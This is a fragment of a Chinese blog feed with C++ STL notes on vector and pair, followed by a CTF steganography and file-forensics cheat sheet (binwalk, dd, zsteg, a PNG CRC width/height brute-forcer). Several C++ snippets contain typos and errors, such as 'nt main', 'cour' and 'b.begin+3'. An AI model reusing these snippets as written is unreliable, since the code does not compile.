        <content type="html"><![CDATA[<h2 id="Vector（动态数组）"><a href="#Vector（动态数组）" class="headerlink" title="Vector（动态数组）"></a>Vector（动态数组）</h2><h4 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><ol><li>定义一个vector  未初始化 输出 0</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;<span class="hljs-type">int</span>&gt; a;<br></code></pre></td></tr></table></figure><ol start="2"><li>定义一个长度为3 的vector 未初始化 输出 0</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">3</span>)</span></span>;<br></code></pre></td></tr></table></figure><ol start="3"><li>定义一个长度为10 的vector 每个数赋值为 3</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">10</span>,<span class="hljs-number">3</span>)</span></span>;<br></code></pre></td></tr></table></figure><ol start="4"><li>将向量b中从下标 0 1 2（共三个）的元素赋值给a ，a 的类型为int型</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(b.begin(),b.begin<span class="hljs-number">+3</span>)</span></span>;<br></code></pre></td></tr></table></figure><ol start="5"><li>从数组中获得初始值</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-type">int</span> b[<span class="hljs-number">7</span>] = &#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>&#125;<br>vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-built_in">a</span>(b,b<span class="hljs-number">+7</span>);<br></code></pre></td></tr></table></figure><ol start="6"><li>输出</li></ol><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:a)<br>&#123;<br>cout &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="size"><a href="#size" class="headerlink" title="size()"></a>size()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">a.<span class="hljs-built_in">size</span>()    <span class="hljs-comment">// 返回元素个数</span><br></code></pre></td></tr></table></figure><h3 id="resize"><a href="#resize" class="headerlink" title="resize()"></a>resize()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">a.<span class="hljs-built_in">resize</span>()    <span class="hljs-comment">// 改变大小</span><br></code></pre></td></tr></table></figure><h3 id="empty"><a href="#empty" class="headerlink" title="empty()"></a>empty()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a.<span class="hljs-built_in">empty</span>();    <br><span class="hljs-comment">// 判断a是否为空，空则返回true，非空则返回false</span><br></code></pre></td></tr></table></figure><h3 id="front-和-back"><a href="#front-和-back" class="headerlink" title="front() 和 back()"></a>front() 和 back()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">a.<span class="hljs-built_in">front</span>();<br><span class="hljs-comment">// 返回a的第一个元素，当且仅当a存在</span><br>a.<span class="hljs-built_in">back</span>();<br><span class="hljs-comment">// 返回vector的最后一个数</span><br></code></pre></td></tr></table></figure><h3 id="倍增思想"><a href="#倍增思想" class="headerlink" title="倍增思想"></a>倍增思想</h3><p>C++ 系统为某一程序分配空间的所需时间，与空间大小无关，与申请次数有关如果申请一个空间为1000 和 空间 为1 申请1000 次的所需时间差别是很大的，申请次数越多，越耗时间。</p><h3 id="clear"><a href="#clear" class="headerlink" title="clear()"></a>clear()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++">a.<span class="hljs-built_in">clear</span>();<br><span class="hljs-comment">//清空a中的元素</span><br></code></pre></td></tr></table></figure><h3 id="支持比较运算"><a href="#支持比较运算" class="headerlink" title="支持比较运算"></a>支持比较运算</h3><p>比较操作 &#x3D;&#x3D; , !&#x3D; , &lt;  , &gt; , &lt;&#x3D; , &gt;&#x3D; </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-comment">//支持比较运算</span><br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">a</span><span class="hljs-params">(<span class="hljs-number">4</span>,<span class="hljs-number">3</span>)</span>,<span class="hljs-title">b</span><span class="hljs-params">(<span class="hljs-number">3</span>,<span class="hljs-number">4</span>)</span></span>;<br>    <span class="hljs-comment">// a: 3 3 3 3  b: 4 4 4 </span><br>    <span class="hljs-comment">//比较原理   字典序 （根据最前面哪个判断，如果一样就往后比较）</span><br>    <span class="hljs-keyword">if</span>(a &lt; b)<br>        cout &lt;&lt; <span class="hljs-string">&quot;a &lt; b&quot;</span> &lt;&lt; endl;<br>        <br>&#125;<br></code></pre></td></tr></table></figure><h3 id="push-back-和-pop-back"><a href="#push-back-和-pop-back" class="headerlink" title="push_back() 和 pop_back()"></a>push_back() 和 pop_back()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c++">a.<span class="hljs-built_in">push_back</span>(<span class="hljs-number">5</span>);<br><span class="hljs-comment">// 在a的最后一个向量后插入一个元素，其值为5</span><br>a.<span class="hljs-built_in">pop_back</span>();<br><span class="hljs-comment">//删除a向量的最后一个元素</span><br></code></pre></td></tr></table></figure><h3 id="begin-和end"><a href="#begin-和end" class="headerlink" title="begin()和end()"></a>begin()和end()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++">a.<span class="hljs-built_in">begin</span>();  <span class="hljs-comment">// vector的第0个数；</span><br>a.<span class="hljs-built_in">end</span>(); <span class="hljs-comment">// vector的最后一个数的后面一个数</span><br>通常与<span class="hljs-keyword">for</span>循环结合使用<br></code></pre></td></tr></table></figure><h3 id="遍历vector的三种方法"><a href="#遍历vector的三种方法" class="headerlink" title="遍历vector的三种方法"></a>遍历vector的三种方法</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">nt <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    vector&lt;<span class="hljs-type">int</span>&gt; a;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)<br>    &#123;<br>        a.<span class="hljs-built_in">push_back</span>(i);<br>    &#125;<br>    <span class="hljs-comment">// 三种遍历vector的方法</span><br>    <span class="hljs-comment">//第一种</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;a.<span class="hljs-built_in">size</span>();i++)<br>    &#123;<br>        cout &lt;&lt; a[i] &lt;&lt; <span class="hljs-string">&quot; &quot;</span> ;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-comment">// 第二种</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> i=a.<span class="hljs-built_in">begin</span>();i!= a.<span class="hljs-built_in">end</span>();i++)<br>    &#123;<br>        cout &lt;&lt; *i &lt;&lt; <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-comment">// 第三种    C++11 新语法</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-keyword">auto</span> x:a)<br>    &#123;<br>        cour &lt;&lt; x &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;<br>    &#125;<br>    cout &lt;&lt; endl;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="结合算法erase-reverse"><a href="#结合算法erase-reverse" class="headerlink" title="结合算法erase() reverse()"></a>结合算法erase() reverse()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    a.<span class="hljs-built_in">erase</span>(b);  <span class="hljs-comment">//从a中删除迭代器p指定的元素，p必须只想c中的一个真实元素，不能是最后一个元素 end()</span><br>    a.<span class="hljs-built_in">erase</span>(b,e); <span class="hljs-comment">// 从a中删除迭代器对b和e所表示的范围中的元素，返回e</span><br>    <br>    vector&lt;<span class="hljs-type">int</span>&gt; a=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>&#125;;<br>    <span class="hljs-built_in">reverse</span>(a.<span class="hljs-built_in">begin</span>(),a.<span class="hljs-built_in">end</span>()); <span class="hljs-comment">//a的值为 5,4,3,2,1 倒置</span><br>        <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> STL </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>STL库（二）--Pair[x,y]</title>
      <link href="/posts/9f9af3f5/"/>
      <url>/posts/9f9af3f5/</url>
      
        <content type="html"><![CDATA[<h2 id="Pair-x-y"><a href="#Pair-x-y" class="headerlink" title="Pair[x,y]"></a>Pair[x,y]</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs cpp">可以理解为（x,y）数学中的坐标表示<br>小技巧：使用<span class="hljs-keyword">typedef</span>定义 <span class="hljs-keyword">typedef</span> pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt; PII<br></code></pre></td></tr></table></figure><h3 id="头文件"><a href="#头文件" class="headerlink" title="头文件"></a>头文件</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;utility&gt;</span></span><br></code></pre></td></tr></table></figure><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 两种方法初始化</span><br><span class="hljs-function">pair&lt;string,<span class="hljs-type">int</span>&gt; <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">1</span>)</span></span>;<br>p = <span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><h3 id="first-和-second"><a href="#first-和-second" class="headerlink" title="first() 和 second()"></a>first() 和 second()</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-built_in">p</span>(<span class="hljs-string">&quot;hello&quot;</span>,<span class="hljs-number">1</span>);<br>p.first; <span class="hljs-comment">//第一个元素 = hello;</span><br>p.second; <span class="hljs-comment">// 第二个元素 = 1;</span><br></code></pre></td></tr></table></figure><h3 id="嵌套（套娃）"><a href="#嵌套（套娃）" class="headerlink" title="嵌套（套娃）"></a>嵌套（套娃）</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c++">vector&lt;vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;&gt;  <span class="hljs-comment">//与vector结合再写个vector结合即可</span><br></code></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//套娃操作 用pair 存储3个数据</span><br>pair&lt;<span class="hljs-type">int</span>,pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt; <span class="hljs-built_in">p</span>(<span class="hljs-number">1</span>,&#123;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>&#125;);<br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> C++ </tag>
            
            <tag> STL </tag>
            
            <tag> 算法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF-MISC杂项</title>
      <link href="/posts/d708c66/"/>
      <url>/posts/d708c66/</url>
      
        <content type="html"><![CDATA[<h1 id="MISC-杂项"><a href="#MISC-杂项" class="headerlink" title="MISC 杂项"></a>MISC 杂项</h1><h2 id="文件的操作"><a href="#文件的操作" class="headerlink" title="文件的操作"></a>文件的操作</h2><h3 id="文件类型识别"><a href="#文件类型识别" class="headerlink" title="文件类型识别"></a>文件类型识别</h3><ol><li>file 命令使用场景：不知道文件名，无法打开文件</li><li>winhex          使用场景：windows下通过文件头信息判断文件类型</li></ol><p>常见文件头、文件尾</p><table><thead><tr><th>文件格式</th><th>文件头</th><th>文件尾</th></tr></thead><tbody><tr><td>JPEG (jpg)文件头</td><td>FFD8FF</td><td>FF D9</td></tr><tr><td>PNG (png)文件头</td><td>89504E47</td><td>AE 42 60 82</td></tr><tr><td>GIF (gif) 文件头</td><td>47494638</td><td>00 3B</td></tr><tr><td>TIFF (tif)文件头</td><td>49492A00</td><td></td></tr><tr><td>XML (xml)文件头</td><td>3C3F786D6C</td><td></td></tr><tr><td>HTML (html)文件头</td><td>68746D6C3E</td><td></td></tr><tr><td>Adobe Acrobat (pdf)文件头</td><td>255044462D312E</td><td></td></tr><tr><td>ZIP Archive (zip)文件头</td><td>504B0304</td><td>504B</td></tr><tr><td>TAR （tar.gz）文件头</td><td>1F8B0800</td><td></td></tr><tr><td>RAR Archive (rar)文件头</td><td>526172211A0700 C43D7B00400700</td><td>C43D7B00400700</td></tr><tr><td>Wave (wav)文件头</td><td>57415645</td><td></td></tr><tr><td>AVI (avi)，文件头</td><td>41564920</td><td></td></tr><tr><td>MS Word&#x2F;Excel (xls.or.doc)文件头</td><td>D0CF11E0</td><td></td></tr><tr><td>Adobe Photoshop (psd)文件头</td><td>38425053</td><td></td></tr><tr><td>Windows Bitmap (bmp) 文件头</td><td>424D</td><td></td></tr></tbody></table><h3 id="文件分离"><a href="#文件分离" class="headerlink" title="文件分离"></a>文件分离</h3><ol><li>binwalk  工具</li></ol><p>用法：</p><ul><li>分析文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> binwalk filename<br></code></pre></td></tr></table></figure><ul><li>分离文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> binwalk -e filename<br></code></pre></td></tr></table></figure><ol><li>foremost 工具</li></ol><p>如果 binwalk 无法正确 分离出文件，可以使用该工具</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> foremost 文件名 -o 输出文件夹<br></code></pre></td></tr></table></figure><ol><li>dd</li></ol><p>当文件自动分离出错或者因为其他原因无法自动分离时，可以使用 dd 实现文件手动分离</p><p>用法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">dd</span> <span class="hljs-keyword">if</span>=源文件 of=目标文件名 bs=1 skip=开始分离的字节数<br></code></pre></td></tr></table></figure><p>参数说明：</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">if</span>=file <span class="hljs-comment">#输入文件名，缺省为标准输入</span><br><span class="hljs-attr">of</span>=file <span class="hljs-comment">#输出文件名，缺省为标准输入</span><br><span class="hljs-attr">bs</span>=bytes<span class="hljs-comment">#同时设置读写块的大小为bytes，可代替ibs和obs</span><br><span class="hljs-attr">skip</span>=blocks<span class="hljs-comment">#从输入文件开头跳过blocks个块后再开始复制</span><br></code></pre></td></tr></table></figure><p><strong>方法二：可以尝试修改后缀名，但当隐藏了多种格式时可能会失败</strong></p><h3 id="文件合并"><a href="#文件合并" class="headerlink" title="文件合并"></a>文件合并</h3><ol><li>Linux 下的文件合并</li></ol><p>使用场景：linux 下，通常对文件名相似的文件要进行批量合并</p><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> 文件名1 文件名2 文件名3 &gt; 输出的文件<br></code></pre></td></tr></table></figure><p>完整性检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">md5sum</span> 文件名<br></code></pre></td></tr></table></figure><ol start="2"><li>windows 下的文件合并</li></ol><p>使用场景：windows 下，通常要对文件名相似的文件进行批量合并</p><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">copy /B 合并的文件 输出的文件命令<br></code></pre></td></tr></table></figure><p>完整性检测：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">certutil -hashfile 文件名 md5 <br></code></pre></td></tr></table></figure><h2 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h2><h3 id="补充："><a href="#补充：" class="headerlink" title="补充："></a>补充：</h3><p>​首先使用 16进制编辑器 查看文件 或者使用 binwalk  有时 flag 会直接写在 里面</p><h3 id="LSB-隐写"><a href="#LSB-隐写" class="headerlink" title="LSB 隐写"></a>LSB 隐写</h3><ol><li>zsteg 工具</li></ol><p>使用：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">zsteg xxxx.jpg<br></code></pre></td></tr></table></figure><ol start="2"><li>wbstego4 工具</li></ol><p>解密通过 lsb 加密的图片，bmp格式</p><p><img src="/posts/d708c66/1.png"></p><ol start="3"><li>stegsolve</li></ol><p><img src="/posts/d708c66/aaaaa.png"></p><h3 id="文件CRC校验出错"><a href="#文件CRC校验出错" class="headerlink" title="文件CRC校验出错"></a>文件CRC校验出错</h3><p>图片 CRC 计算</p><p>TweakPNG</p><p><img src="/posts/d708c66/2.png"></p><p><img src="/posts/d708c66/32.png"></p><p>python -&gt; 计算文件宽高 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> argparse<br><span class="hljs-keyword">import</span> itertools<br><br><br>parser = argparse.ArgumentParser()<br>parser.add_argument(<span class="hljs-string">&quot;-f&quot;</span>, <span class="hljs-built_in">type</span>=<span class="hljs-built_in">str</span>, default=<span class="hljs-literal">None</span>, required=<span class="hljs-literal">True</span>,<br>                 <span class="hljs-built_in">help</span>=<span class="hljs-string">&quot;输入同级目录下图片的名称&quot;</span>)<br>args  = parser.parse_args()<br><br><br>bin_data = <span class="hljs-built_in">open</span>(args.f, <span class="hljs-string">&#x27;rb&#x27;</span>).read()<br>crc32key = zlib.crc32(bin_data[<span class="hljs-number">12</span>:<span class="hljs-number">29</span>]) <span class="hljs-comment"># 计算crc</span><br>original_crc32 = <span class="hljs-built_in">int</span>(bin_data[<span class="hljs-number">29</span>:<span class="hljs-number">33</span>].<span class="hljs-built_in">hex</span>(), <span class="hljs-number">16</span>) <span class="hljs-comment"># 原始crc</span><br><br><br><span class="hljs-keyword">if</span> crc32key == original_crc32: <span class="hljs-comment"># 计算crc对比原始crc</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;宽高没有问题!&#x27;</span>)<br><span class="hljs-keyword">else</span>:<br>    input_ = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;宽高被改了, 是否CRC爆破宽高? (Y/n):&quot;</span>)<br>    <span class="hljs-keyword">if</span> input_ <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> [<span class="hljs-string">&quot;Y&quot;</span>, <span class="hljs-string">&quot;y&quot;</span>, <span class="hljs-string">&quot;&quot;</span>]:<br>        exit()<br>    <span class="hljs-keyword">else</span>: <br>        <span class="hljs-keyword">for</span> i, j <span class="hljs-keyword">in</span> itertools.product(<span class="hljs-built_in">range</span>(<span class="hljs-number">4095</span>), <span class="hljs-built_in">range</span>(<span class="hljs-number">4095</span>)): <span class="hljs-comment"># 理论上0x FF FF FF FF，但考虑到屏幕实际/cpu，0x 0F FF就差不多了，也就是4095宽度和高度</span><br>            data = bin_data[<span class="hljs-number">12</span>:<span class="hljs-number">16</span>] + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, i) + struct.pack(<span class="hljs-string">&#x27;&gt;i&#x27;</span>, j) + bin_data[<span class="hljs-number">24</span>:<span class="hljs-number">29</span>]<br>            crc32 = zlib.crc32(data)<br>            <span class="hljs-keyword">if</span>(crc32 == original_crc32): <span class="hljs-comment"># 计算当图片大小为i:j时的CRC校验值，与图片中的CRC比较，当相同，则图片大小已经确定</span><br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\nCRC32: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(original_crc32)&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;宽度: <span class="hljs-subst">&#123;i&#125;</span>, hex: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(i)&#125;</span>&quot;</span>)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;高度: <span class="hljs-subst">&#123;j&#125;</span>, hex: <span class="hljs-subst">&#123;<span class="hljs-built_in">hex</span>(j)&#125;</span>&quot;</span>)<br>                exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><p>使用方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bashf">python 文件名.py -f 图片<br></code></pre></td></tr></table></figure><h3 id="Exif隐写"><a href="#Exif隐写" class="headerlink" title="Exif隐写"></a>Exif隐写</h3><p>Exiftools</p><p><img src="/posts/d708c66/14.png"></p><h3 id="GIF-隐写"><a href="#GIF-隐写" class="headerlink" title="GIF 隐写"></a>GIF 隐写</h3><p>stegsole -&gt;  需要 java 环境</p><p><img src="/posts/d708c66/31.png"></p><p>逐帧查看</p><h3 id="bftools-工具"><a href="#bftools-工具" class="headerlink" title="bftools 工具"></a>bftools 工具</h3><p>使用场景：在 windows 的 cmd 下，对加密过的图片文件进行解密</p><p><img src="/posts/d708c66/15.png"></p><p>格式：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bftools decode braincopter 要解密的图片名称 -out 输出文件名<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">bftools run 上一步输出的文件名称<br></code></pre></td></tr></table></figure><h3 id="silenteye-工具"><a href="#silenteye-工具" class="headerlink" title="silenteye 工具"></a>silenteye 工具</h3><p><img src="/posts/d708c66/16.png"></p><p>对音频或者图片解密</p><h3 id="Stegdetect-工具探测加密方式"><a href="#Stegdetect-工具探测加密方式" class="headerlink" title="Stegdetect 工具探测加密方式"></a>Stegdetect 工具探测加密方式</h3><p>根据探测到的加密方式，选择对应的工具破解</p><p>常见加密 : steg, Jphide, outguess, invisible secretc, f5 appendx 和 camouflage</p><p><img src="/posts/d708c66/18.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">stegdetect 文件名<br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">stegdetect -s 敏感度 文件名<br></code></pre></td></tr></table></figure><h3 id="outguess-工具"><a href="#outguess-工具" class="headerlink" title="outguess 工具"></a>outguess 工具</h3><p>当 stegdetect 提示 outguess 加密时 </p><p><img src="/posts/d708c66/17.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">outguess 要解密的文件名 输出结果文件名<br></code></pre></td></tr></table></figure><h3 id="JPhs-工具"><a href="#JPhs-工具" class="headerlink" title="JPhs 工具"></a>JPhs 工具</h3><p><img src="/posts/d708c66/19.png"></p><h3 id="F5"><a href="#F5" class="headerlink" title="F5"></a>F5</h3><p>使用场景，当 stegdetect 识别出来是F5 加密的图片</p><p>使用方法 ： 进入F5 -steganography_F5 目录 ,将 图片 拷贝 到给目录下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">java extact 要解密的文件名 -p 密码<br></code></pre></td></tr></table></figure><h3 id="CQR-二维码处理"><a href="#CQR-二维码处理" class="headerlink" title="CQR 二维码处理"></a>CQR 二维码处理</h3><p><img src="/posts/d708c66/20.png"></p><h2 id="压缩文件处理"><a href="#压缩文件处理" class="headerlink" title="压缩文件处理"></a>压缩文件处理</h2><h3 id="伪加密"><a href="#伪加密" class="headerlink" 